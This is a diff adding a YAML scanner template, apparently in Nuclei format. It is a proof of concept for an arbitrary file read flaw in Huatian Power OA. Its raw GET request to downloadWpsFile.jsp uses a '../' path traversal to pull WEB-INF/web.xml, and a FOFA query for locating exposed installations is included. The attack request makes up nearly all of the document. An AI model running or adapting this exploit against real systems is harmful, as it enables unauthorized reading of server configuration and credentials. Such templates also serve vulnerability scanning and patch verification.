@@ -1,0 +1,21 @@
+id: poc-iaydx4gd8n1co11g
+info:
+  name: 华天动力 OA downloadWpsFile任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iaydx4gd8n1co11g'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iaydx4gd8n1co11g
+    fofa: app:"华天动力 OA"
+http:
+- raw:
+  - 'GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
